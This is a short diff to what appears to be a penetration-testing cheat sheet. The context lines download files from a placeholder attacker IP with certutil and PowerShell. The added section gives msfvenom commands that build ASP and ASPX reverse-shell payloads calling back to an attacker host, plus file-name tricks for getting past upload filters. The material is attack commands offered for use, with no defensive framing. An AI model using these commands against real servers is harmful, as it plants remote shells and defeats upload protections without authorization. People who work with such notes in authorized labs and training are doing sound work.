@@ -38,3 +38,15 @@ file transfer
 certutil -urlcache -split -f "http://<target ip>/<file>" C:\Users\<User Account>\Desktop\<file>
 PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
 ```
+
+ASP & ASPX reverse shell
+
+```shell
+# ASP
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f asp -o rev.asp
+# ASPX
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f aspx -o rev.aspx
+# file upload bypass
+# try filename "rev.aspx..... .. . . ."
+# try filename "rev.aspx.png"
+```
